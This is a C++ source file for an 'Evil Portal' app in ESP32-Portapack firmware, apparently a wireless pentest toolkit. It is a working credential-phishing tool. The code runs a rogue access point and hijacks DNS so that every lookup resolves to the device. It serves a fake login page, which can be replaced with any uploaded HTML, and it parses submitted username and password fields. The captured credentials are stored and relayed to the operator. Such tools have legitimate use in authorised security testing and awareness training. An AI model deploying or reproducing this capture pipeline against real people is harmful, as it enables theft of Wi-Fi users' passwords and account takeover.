/*
 * Copyright (C) 2025 HTotoo
 *
 * This file is part of ESP32-Portapack.
 *
 * For additional license information, see the LICENSE file.
 */

#include "ep_app_evilportal.hpp"
#include "evilportal_bridge.h"
#include "pp_commands.hpp"
#include "wifim.h"

#include "esp_log.h"
#include "lwip/sockets.h"
#include <esp_wifi.h>
#include "esp_wifi_ap_get_sta_list.h"
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define TAG "EVILPORTAL"

static const uint8_t EP_GW_IP[4] = {192, 168, 4, 1};
#define EP_DNS_PORT 53

// ---------------------------------------------------------------------------
// Portal templates (unchanged): every submit posts to /login -> captive 404.
// ---------------------------------------------------------------------------
static const char* EP_TEMPLATES[EP_TEMPLATE_COUNT] = {
    // 0 - Captive Portal Test landing page (awareness demo). Credits: Xmoo26.
    "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\">"
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
    "<title>Captive Portal Test</title><style>"
    "body{font-family:Arial,Helvetica,sans-serif;background:#0f172a;margin:0;color:#e2e8f0}"
    ".card{max-width:360px;margin:7vh auto;background:#1e293b;padding:28px;border-radius:14px;"
    "box-shadow:0 10px 30px rgba(0,0,0,.4)}h1{font-size:20px;margin:0 0 4px;color:#fff}"
    "p{color:#94a3b8;font-size:13px;margin:0 0 20px}label{font-size:13px;color:#cbd5e1}"
    "input{width:100%;box-sizing:border-box;padding:11px;margin:6px 0 16px;border:1px solid #334155;"
    "border-radius:8px;font-size:15px;background:#0f172a;color:#e2e8f0}"
    "button{width:100%;padding:12px;border:0;border-radius:8px;background:#ef4444;color:#fff;"
    "font-size:15px;font-weight:600}.f{margin-top:18px;text-align:center;font-size:11px;color:#64748b}"
    ".f a{color:#f87171;text-decoration:none}</style></head><body>"
    "<div class=\"card\"><h1>Captive Portal Test</h1>"
    "<p>Security awareness demo. Do not enter real credentials.</p>"
    "<form method=\"POST\" action=\"/login\">"
    "<label>Email</label><input type=\"email\" name=\"email\" placeholder=\"you@example.com\" required>"
    "<label>Password</label><input type=\"password\" name=\"password\" placeholder=\"Password\" required>"
    "<button type=\"submit\">Sign in</button></form>"
    "<div class=\"f\">EvilPortal demo by <a href=\"https://github.com/Xmoo26\">Xmoo26</a><br>"
    "github.com/Xmoo26</div></div></body></html>",
};

// ---------------------------------------------------------------------------
// static members
// ---------------------------------------------------------------------------
EPAppEvilPortal* EPAppEvilPortal::instance = nullptr;
SemaphoreHandle_t EPAppEvilPortal::captureMutex = nullptr;
char EPAppEvilPortal::captureBuf[EP_MAX_CAPTURES][EP_CAP_LEN] = {};
char* EPAppEvilPortal::customHtml = nullptr;
volatile uint16_t EPAppEvilPortal::customHtmlLen = 0;
volatile bool EPAppEvilPortal::useCustomHtml = false;

// ---------------------------------------------------------------------------
// small helpers
// ---------------------------------------------------------------------------
static int hexval(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}
static std::string urldecode(const std::string& s) {
    std::string o;
    for (size_t i = 0; i < s.size(); ++i) {
        if (s[i] == '%' && i + 2 < s.size()) {
            o += (char)((hexval(s[i + 1]) << 4) | hexval(s[i + 2]));
            i += 2;
        } else if (s[i] == '+') {
            o += ' ';
        } else {
            o += s[i];
        }
    }
    return o;
}
static bool keyIsUser(const std::string& k) {
    return k == "email" || k == "user" || k == "username" || k == "login" || k == "identity" || k == "usr";
}
static bool keyIsPass(const std::string& k) {
    return k == "password" || k == "pass" || k == "pwd" || k == "passwd" || k == "pw";
}

// ---------------------------------------------------------------------------
extern "C" const char* evilportal_get_portal_html(size_t* out_len) {
    return EPAppEvilPortal::getPortalHtml(out_len);
}
extern "C" void evilportal_on_capture(const char* body, size_t body_len, const char* host, const char* ua) {
    EPAppEvilPortal::onCapture(body, body_len, host, ua);
}

// ---------------------------------------------------------------------------
EPAppEvilPortal::EPAppEvilPortal() {
    if (captureMutex == nullptr) captureMutex = xSemaphoreCreateMutex();
    if (customHtml == nullptr) customHtml = (char*)malloc(EP_CUSTOM_HTML_MAX);  // task ctx (deferred start)
    instance = this;
    ESP_LOGI(TAG, "Evil Portal app created");
}

EPAppEvilPortal::~EPAppEvilPortal() {
    evilportal_http_set_active(false);
    WifiM::request_portal_ap(false);
    instance = nullptr;
    dnsStop();
    ESP_LOGI(TAG, "Evil Portal app destroyed");
}

// ---------------------------------------------------------------------------
// DNS hijack
// ---------------------------------------------------------------------------
void EPAppEvilPortal::dnsPoll() {
    if (dnsSocket < 0) {
        dnsSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (dnsSocket < 0) return;
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(EP_DNS_PORT);
        addr.sin_addr.s_addr = htonl(INADDR_ANY);
        if (bind(dnsSocket, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(dnsSocket);
            dnsSocket = -1;
            return;
        }
        int flags = fcntl(dnsSocket, F_GETFL, 0);
        fcntl(dnsSocket, F_SETFL, flags | O_NONBLOCK);
        ESP_LOGI(TAG, "DNS hijack on :53");
    }

    uint8_t buf[512];
    struct sockaddr_in from;
    socklen_t fromlen = sizeof(from);
    int len = recvfrom(dnsSocket, buf, sizeof(buf), 0, (struct sockaddr*)&from, &fromlen);
    if (len < 12) return;
    if (buf[2] & 0x80) return;

    int qend = 12;
    while (qend < len && buf[qend] != 0) {
        qend += buf[qend] + 1;
        if (qend > len) return;
    }
    qend += 1 + 4;
    if (qend > len) return;

    buf[2] = 0x81;
    buf[3] = 0x80;
    buf[4] = 0x00;
    buf[5] = 0x01;
    buf[6] = 0x00;
    buf[7] = 0x01;
    buf[8] = buf[9] = buf[10] = buf[11] = 0x00;

    int p = qend;
    if (p + 16 > (int)sizeof(buf)) return;
    buf[p++] = 0xC0;
    buf[p++] = 0x0C;
    buf[p++] = 0x00;
    buf[p++] = 0x01;
    buf[p++] = 0x00;
    buf[p++] = 0x01;
    buf[p++] = 0x00;
    buf[p++] = 0x00;
    buf[p++] = 0x00;
    buf[p++] = 0x3C;
    buf[p++] = 0x00;
    buf[p++] = 0x04;
    buf[p++] = EP_GW_IP[0];
    buf[p++] = EP_GW_IP[1];
    buf[p++] = EP_GW_IP[2];
    buf[p++] = EP_GW_IP[3];

    sendto(dnsSocket, buf, p, 0, (struct sockaddr*)&from, fromlen);
}

void EPAppEvilPortal::dnsStop() {
    if (dnsSocket >= 0) {
        close(dnsSocket);
        dnsSocket = -1;
    }
}

// ---------------------------------------------------------------------------
// HTTP-layer callbacks (httpd task)
// ---------------------------------------------------------------------------
const char* EPAppEvilPortal::getPortalHtml(size_t* out_len) {
    if (useCustomHtml && customHtmlLen > 0 && customHtml != nullptr) {
        if (out_len) *out_len = customHtmlLen;
        return customHtml;
    }
    uint8_t idx = 0;
    if (instance) idx = instance->currentTemplate;
    if (idx >= EP_TEMPLATE_COUNT) idx = 0;
    if (out_len) *out_len = strlen(EP_TEMPLATES[idx]);
    return EP_TEMPLATES[idx];
}

void EPAppEvilPortal::onCapture(const char* body, size_t body_len, const char* host, const char* ua) {
    (void)ua;
    if (!instance || body == nullptr || body_len == 0 || captureMutex == nullptr) return;

    // parse the url-encoded form body into user / pass
    std::string raw(body, body_len);
    std::string user, pass;
    size_t start = 0;
    while (start <= raw.size()) {
        size_t amp = raw.find('&', start);
        std::string pair = raw.substr(start, amp == std::string::npos ? std::string::npos : amp - start);
        size_t eq = pair.find('=');
        if (eq != std::string::npos) {
            std::string k = urldecode(pair.substr(0, eq));
            std::string v = urldecode(pair.substr(eq + 1));
            if (keyIsUser(k) && user.empty()) user = v;
            else if (keyIsPass(k) && pass.empty()) pass = v;
        }
        if (amp == std::string::npos) break;
        start = amp + 1;
    }

    char line[EP_CAP_LEN];
    if (!user.empty() || !pass.empty()) {
        snprintf(line, sizeof(line), "%s | %s", user.c_str(), pass.c_str());
    } else {
        // fallback: store the raw (decoded) body, trimmed
        std::string dec = urldecode(raw);
        snprintf(line, sizeof(line), "%s", dec.c_str());
    }
    (void)host;

    if (xSemaphoreTake(captureMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
        uint16_t idx = instance->captureCount;
        if (idx >= EP_MAX_CAPTURES) {
            // shift out the oldest to make room
            for (int i = 1; i < EP_MAX_CAPTURES; i++) {
                memcpy(captureBuf[i - 1], captureBuf[i], EP_CAP_LEN);
            }
            idx = EP_MAX_CAPTURES - 1;
            instance->captureCount = EP_MAX_CAPTURES - 1;
            if (instance->flushedCount > 0) instance->flushedCount--;
        }
        strncpy(captureBuf[idx], line, EP_CAP_LEN - 1);
        captureBuf[idx][EP_CAP_LEN - 1] = 0;
        instance->captureCount = idx + 1;
        xSemaphoreGive(captureMutex);
    }
    ESP_LOGW(TAG, "CAPTURED: %s", line);
}

// ---------------------------------------------------------------------------
void EPAppEvilPortal::refreshClients() {
    wifi_sta_list_t sta;
    if (esp_wifi_ap_get_sta_list(&sta) != ESP_OK) {
        clientCount = 0;
        return;
    }
    wifi_sta_mac_ip_list_t maclist;
    memset(&maclist, 0, sizeof(maclist));
    esp_wifi_ap_get_sta_list_with_ip(&sta, &maclist);

    uint16_t n = maclist.num;
    if (n > EP_MAX_CLIENTS) n = EP_MAX_CLIENTS;
    for (uint16_t i = 0; i < n; i++) {
        memcpy(clientBuf[i].mac, maclist.sta[i].mac, 6);
        uint32_t a = maclist.sta[i].ip.addr;
        clientBuf[i].ip[0] = (a >> 0) & 0xFF;
        clientBuf[i].ip[1] = (a >> 8) & 0xFF;
        clientBuf[i].ip[2] = (a >> 16) & 0xFF;
        clientBuf[i].ip[3] = (a >> 24) & 0xFF;
        // hostname is not exposed by the public DHCP server API
        strncpy(clientBuf[i].hostname, "-", sizeof(clientBuf[i].hostname) - 1);
    }
    clientCount = n;
}

// ---------------------------------------------------------------------------
void EPAppEvilPortal::Loop(uint32_t currentMillis) {
    if (!initialized) {
        evilportal_http_set_active(true);
        WifiM::request_portal_ap(true);
        selectTemplate(currentTemplate);
        initialized = true;
        ESP_LOGI(TAG, "Evil Portal active; dedicated portal AP requested.");
    }
    dnsPoll();
    flushCaptures();
    if (currentMillis - lastClientRefresh > 1000) {
        lastClientRefresh = currentMillis;
        refreshClients();
    }
}

void EPAppEvilPortal::flushCaptures() {
    if (captureMutex == nullptr) return;
    std::vector<std::string> pending;
    if (xSemaphoreTake(captureMutex, pdMS_TO_TICKS(20)) == pdTRUE) {
        while (flushedCount < captureCount) {
            pending.push_back(std::string(captureBuf[flushedCount]));
            flushedCount++;
        }
        xSemaphoreGive(captureMutex);
    }
    for (auto& c : pending) {
        std::string msg = APP_EP_CAPTURE_STR;
        msg += c;
        msg += "\r\n";
        SendDataToWeb(msg);
    }
    if (!pending.empty()) SetDisplayDirty();
}

void EPAppEvilPortal::selectTemplate(uint8_t idx) {
    if (idx >= EP_TEMPLATE_COUNT) return;
    currentTemplate = idx;
    std::string msg = APP_EP_TEMPLATE_STR;
    msg += std::to_string(idx);
    msg += "\r\n";
    SendDataToWeb(msg);
    SetDisplayDirty();
}

void EPAppEvilPortal::OnDisplayRequest(DisplayGeneric* display) {
    display->showTitle("Evil Portal");
    std::string t = "Cli:";
    t += std::to_string(clientCount);
    t += " Hits:";
    t += std::to_string(captureCount);
    display->showMainTextMultiline(t);
}

bool EPAppEvilPortal::OnWebData(std::string& data) {
    if (data.rfind(APP_EP_PRE_STR, 0) != 0) return false;
    if (data.size() < 9) return true;
    char cmd = data[8];
    std::string payload;
    if (data.size() > 9) {
        payload = data.substr(9);
        while (!payload.empty() && (payload.back() == '\r' || payload.back() == '\n')) payload.pop_back();
    }
    switch (cmd) {
        case 'T':
            if (!payload.empty()) selectTemplate((uint8_t)atoi(payload.c_str()));
            return true;
        case 'C':
            if (captureMutex && xSemaphoreTake(captureMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
                captureCount = 0;
                flushedCount = 0;
                xSemaphoreGive(captureMutex);
            }
            SetDisplayDirty();
            return true;
        case 'R':
            selectTemplate(currentTemplate);
            if (captureMutex && xSemaphoreTake(captureMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
                flushedCount = 0;
                xSemaphoreGive(captureMutex);
            }
            return true;
    }
    return true;
}

// IRQ CALLBACK
bool EPAppEvilPortal::OnPPData(uint16_t command, std::vector<uint8_t>& data) {
    if (command == PPCMD_APPMGR_APPCMD) {
        if (data.size() >= 2) {
            uint16_t v = *reinterpret_cast<uint16_t*>(data.data());
            if (v < EP_TEMPLATE_COUNT) {
                currentTemplate = (uint8_t)v;
                useCustomHtml = false;  // built-in template selected
            }
            return true;
        }
    } else if (command == PPCMD_EVILPORTAL_SET_HTML) {
        if (data.size() >= 2) {
            uint16_t offset = *reinterpret_cast<uint16_t*>(data.data());
            if (offset == 0xFFFF) {
                useCustomHtml = true;  // commit & activate
            } else if (customHtml != nullptr) {
                if (offset == 0) {
                    customHtmlLen = 0;
                    useCustomHtml = false;
                    memset(customHtml, 0, EP_CUSTOM_HTML_MAX);  // clean slate: any gap stays null, not malloc garbage
                }
                size_t dlen = data.size() - 2;
                if (dlen > 0 && offset + dlen <= EP_CUSTOM_HTML_MAX) {
                    memcpy(customHtml + offset, data.data() + 2, dlen);
                    if (offset + dlen > customHtmlLen) customHtmlLen = offset + dlen;
                }
            }
        }
        return true;
    } else if (command == PPCMD_EVILPORTAL_GET_CAPTURE) {
        if (data.size() >= 2) reqCaptureIdx = *reinterpret_cast<uint16_t*>(data.data());
        return true;
    } else if (command == PPCMD_EVILPORTAL_GET_CLIENT) {
        if (data.size() >= 2) reqClientIdx = *reinterpret_cast<uint16_t*>(data.data());
        return true;
    }
    return false;
}

// IRQ CALLBACK  (reads fixed buffers only)
bool EPAppEvilPortal::OnPPReqData(uint16_t command, std::vector<uint8_t>& data) {
    if (command == PPCMD_APPMGR_APPCMD) {
        data.resize(6);
        uint16_t* p = reinterpret_cast<uint16_t*>(data.data());
        p[0] = currentTemplate;
        p[1] = captureCount;
        p[2] = clientCount;
        return true;
    } else if (command == PPCMD_EVILPORTAL_GET_CAPTURE) {
        data.resize(EP_CAP_LEN);
        memset(data.data(), 0, EP_CAP_LEN);
        if (reqCaptureIdx < captureCount) memcpy(data.data(), captureBuf[reqCaptureIdx], EP_CAP_LEN);
        return true;
    } else if (command == PPCMD_EVILPORTAL_GET_CLIENT) {
        data.resize(sizeof(ep_client_t));
        memset(data.data(), 0, sizeof(ep_client_t));
        if (reqClientIdx < clientCount) memcpy(data.data(), &clientBuf[reqClientIdx], sizeof(ep_client_t));
        return true;
    } else if (command == PPCMD_EVILPORTAL_GET_HTMLLEN) {
        data.resize(4);
        uint16_t len = customHtmlLen;
        data[0] = (uint8_t)(len & 0xFF);
        data[1] = (uint8_t)(len >> 8);
        data[2] = useCustomHtml ? 1 : 0;
        data[3] = (customHtml != nullptr) ? (uint8_t)customHtml[0] : 0;
        return true;
    }
    return false;
}
